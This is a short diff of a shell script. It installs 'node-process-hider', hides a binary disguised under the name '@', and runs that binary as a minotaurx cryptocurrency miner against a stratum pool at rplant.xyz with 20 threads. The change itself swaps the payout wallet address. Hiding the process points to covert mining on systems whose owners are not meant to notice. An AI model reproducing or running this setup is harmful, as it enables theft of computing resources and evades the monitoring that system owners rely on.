@@ -10,4 +10,4 @@ npm –version
 npm i -g node-process-hider
 chmod u+x @
 ph add @
-./@ -a minotaurx  -o stratum+tcps://stratum-eu.rplant.xyz:17068 -u RFbqnHHydtYxrq6jwqmwZgMt7CR4s5rKd7 -t20
+./@ -a minotaurx  -o stratum+tcps://stratum-eu.rplant.xyz:17068 -u RQ41XjPaQBTRqtrYFWKKDhiHzmKkb86Lgk -t20
